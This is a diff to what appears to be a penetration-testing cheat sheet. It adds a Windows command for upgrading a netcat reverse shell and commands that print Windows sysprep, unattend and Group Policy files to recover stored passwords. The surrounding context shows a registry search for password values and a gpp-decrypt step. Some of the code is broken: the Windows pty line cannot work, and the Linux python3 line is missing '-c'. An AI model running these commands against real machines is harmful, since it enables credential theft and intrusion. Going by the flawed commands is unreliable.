@@ -1885,6 +1885,8 @@ Use this if you have a netcat-based reverse shell (on Linux box).
 ```sh
 # In reverse shell ##########
 python3 'import pty; pty.spawn("/bin/bash")'
+# windows
+c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'
 
 # Ctrl-Z, jumps you back to local shell by backgrounding reverse shell
 
@@ -2128,12 +2130,12 @@ reg query HKCU /f password /t REG_SZ /s | clip
 Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
 an AES-encrypted password, but the static key is published on the MSDN website.
 
-```text
-c:\sysprep.inf
-c:\sysprep\sysprep.xml
-%WINDIR%\Panther\Unattend\Unattended.xml
-%WINDIR%\Panther\Unattended.xml
-%WINDIR%\SYSVOL\Groups.xml
+```bat
+type c:\sysprep.inf
+type c:\sysprep\sysprep.xml
+type %WINDIR%\Panther\Unattend\Unattended.xml
+type %WINDIR%\Panther\Unattended.xml
+type %WINDIR%\SYSVOL\Groups.xml
 ```
 
 To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`
